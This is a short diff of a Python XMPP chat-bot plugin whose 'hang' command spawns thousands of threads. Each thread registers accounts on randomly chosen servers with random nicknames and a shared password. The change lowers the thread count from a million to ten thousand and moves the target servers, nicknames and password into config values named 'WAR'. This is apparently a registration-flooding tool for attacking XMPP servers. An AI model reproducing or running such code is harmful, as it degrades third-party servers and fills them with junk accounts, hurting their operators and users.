@@ -80,7 +80,7 @@ def hang_start(type,source,parameters):
     HANG = 1
     reply(type,source,u'Ok')
     threading.Thread(None, hang_timer, 'hang_timer'+str(random.randrange(0, 9999)), (type,source,parameters)).start()
-    for x in range(0, 1000000):
+    for x in range(0, 10000):
       threading.Thread(None, handler_hang_reg, 'handler_hang_reg'+str(random.randrange(0, 9999)), (type,source,conf)).start()
 
            
@@ -88,9 +88,9 @@ def handler_hang_reg(type, source, conf):
   if not HANG:
     return
   try:
-    gserv = random.choice(HANG_SERV)
-    namez = random.choice(namezz)
-    name, domain, password, newBotJid, mainRes = namez, gserv, 'o9AL33z7x7', 0,'zOeCher'
+    gserv = random.choice(WAR_Serv2)
+    namez = random.choice(WAR_NICKS2)
+    name, domain, password, newBotJid, mainRes = namez, gserv, WAR_PASS2, 0, War_Resource
     node = unicode(name)
     lastnick = name
     jid = xmpp.protocol.JID(node=node, domain=domain, resource=mainRes)
